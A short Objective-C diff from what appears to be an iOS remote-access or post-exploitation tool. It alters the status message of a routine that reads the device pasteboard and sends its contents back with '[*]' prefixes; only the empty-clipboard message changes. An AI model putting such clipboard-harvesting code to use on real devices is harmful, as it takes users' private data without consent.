@@ -256,7 +256,7 @@ bool sysTaskRunning = false;
     } else if ([pb.strings count] == 1){
         [self sendString:[NSString stringWithFormat:@"[*] Pasteboard: '%@'", [pb.strings firstObject]]];
     } else if ([pb.strings count] == 0){
-        [self sendString:[NSString stringWithFormat:@"[*] No items found on pasteboard! (%@)", pb.strings]];
+        [self sendString:[NSString stringWithFormat:@"[*] No items found on pasteboard!"]];
     }
     [self term];
 }
